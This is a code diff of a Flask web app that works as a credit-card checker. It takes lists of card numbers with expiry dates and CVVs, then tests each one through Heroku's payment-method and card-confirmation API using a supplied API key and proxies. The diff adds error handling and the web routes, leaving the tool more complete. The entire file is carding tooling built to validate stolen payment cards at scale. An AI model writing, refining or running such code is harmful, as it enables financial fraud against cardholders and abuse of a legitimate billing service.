@@ -1,19 +1,14 @@
 from flask import Flask, render_template_string, request, jsonify
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO
 import aiohttp
 import asyncio
 import json
 import uuid
-import queue
-import threading
 from datetime import datetime
 
 app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*")
-
-cc_queue = queue.Queue(maxsize=50)
-current_proxy = None
-processing = False
+app.config['SECRET_KEY'] = 'your_secret_key_here'
+socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins='*')
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -60,12 +55,6 @@ HTML_TEMPLATE = '''
             border-left: 4px solid #dc3545;
             color: #c69898;
         }
-        .btn { 
-            font-weight: 600;
-            padding: 10px 20px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
         .form-control {
             background-color: #1a1a1a;
             border: 1px solid #333;
@@ -77,13 +66,6 @@ HTML_TEMPLATE = '''
             color: #fff;
             box-shadow: none;
         }
-        .status-badge {
-            padding: 4px 10px;
-            border-radius: 15px;
-            font-size: 12px;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
     </style>
 </head>
 <body>
@@ -94,7 +76,7 @@ HTML_TEMPLATE = '''
                     <h4>CC Input</h4>
                     <div class="mb-3">
                         <textarea id="ccInput" class="form-control mb-3" rows="5" 
-                            placeholder="Format: 4242424242424242|12|2024|123 (Max 50 CCs)"></textarea>
+                            placeholder="Format: 4242424242424242|12|2024|123"></textarea>
                         <div class="d-flex justify-content-between align-items-center">
                             <span class="text-muted">Cards: <span id="ccCount">0</span>/50</span>
                             <button id="startBtn" class="btn btn-primary">Start Checking</button>
@@ -102,7 +84,6 @@ HTML_TEMPLATE = '''
                     </div>
                 </div>
             </div>
-            
             <div class="col-md-6">
                 <div class="container-box">
                     <h4>Settings</h4>
@@ -111,7 +92,6 @@ HTML_TEMPLATE = '''
                 </div>
             </div>
         </div>
-        
         <div class="container-box">
             <div class="d-flex justify-content-between align-items-center mb-3">
                 <h4 class="mb-0">Live Results</h4>
@@ -120,7 +100,6 @@ HTML_TEMPLATE = '''
             <div class="results-container" id="resultsList"></div>
         </div>
     </div>
-
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
     <script>
         const socket = io();
@@ -148,16 +127,16 @@ HTML_TEMPLATE = '''
             updateStatus('Processing...');
             
             for (const cc of ccs) {
-                await fetch('/check_cc', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        cc: cc,
-                        api_key: apiKey,
-                        proxy: proxy
-                    })
-                });
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Rate limiting
+                try {
+                    const response = await fetch('/check_cc', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({cc, api_key: apiKey, proxy})
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                } catch (error) {
+                    console.error('Error:', error);
+                }
             }
             
             isProcessing = false;
@@ -196,13 +175,23 @@ async def parseX(data, start, end):
     except ValueError:
         return "None"
 
-async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
-    async with session.request(method, url, params=params, headers=headers, data=data, json=json) as response:
-        return await response.text()
-
-async def heroku(cc, api_key, proxy=None):
+async def make_request(session, url, method="POST", params=None, headers=None, data=None, json_data=None):
     try:
-        cc, mon, year, cvv = cc.split("|")
+        async with session.request(
+            method, url, params=params, headers=headers, data=data, json=json_data
+        ) as response:
+            return await response.text()
+    except Exception as e:
+        print(f"Request error: {e}")
+        return None
+
+async def check_cc(cc, api_key, proxy=None):
+    try:
+        cc_data = cc.split("|")
+        if len(cc_data) != 4:
+            return {"status": "error", "message": "Invalid CC format"}
+            
+        cc, mon, year, cvv = cc_data
         guid = str(uuid.uuid4())
         muid = str(uuid.uuid4())
         sid = str(uuid.uuid4())
@@ -232,6 +221,10 @@ async def heroku(cc, api_key, proxy=None):
                 url="https://api.heroku.com/account/payment-method/client-token",
                 headers=headers,
             )
+            
+            if not req:
+                return {"status": "error", "message": "Failed to get client token"}
+                
             client_secret = await parseX(req, '"token":"', '"')
 
             headers2 = {
@@ -273,8 +266,8 @@ async def heroku(cc, api_key, proxy=None):
                 data=data,
             )
 
-            if "pm_" not in req2:
-                return {"status": "error", "message": json.loads(req2).get("error", {}).get("message", "Invalid Card")}
+            if not req2 or "pm_" not in req2:
+                return {"status": "error", "message": "Invalid Card"}
 
             json_sec = json.loads(req2)
             pmid = json_sec["id"]
@@ -305,6 +298,9 @@ async def heroku(cc, api_key, proxy=None):
                 data=data3,
             )
 
+            if not req3:
+                return {"status": "error", "message": "Failed to confirm payment"}
+
             ljson = json.loads(req3)
             if '"status": "succeeded"' in req3:
                 return {"status": "success", "message": "Card Added Successfully"}
@@ -321,6 +317,24 @@ async def heroku(cc, api_key, proxy=None):
 
     except Exception as e:
         return {"status": "error", "message": str(e)}
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/check_cc', methods=['POST'])
+async def handle_check_cc():
+    data = request.get_json()
+    cc = data.get('cc')
+    api_key = data.get('api_key')
+    proxy = data.get('proxy')
+    
+    result = await check_cc(cc, api_key, proxy)
+    result['cc'] = cc
+    result['timestamp'] = datetime.now().strftime('%H:%M:%S')
+    
+    socketio.emit('cc_result', result)
+    return jsonify({"status": "success"})
 
 if __name__ == '__main__':
     socketio.run(app, debug=False, host='0.0.0.0', port=5000)
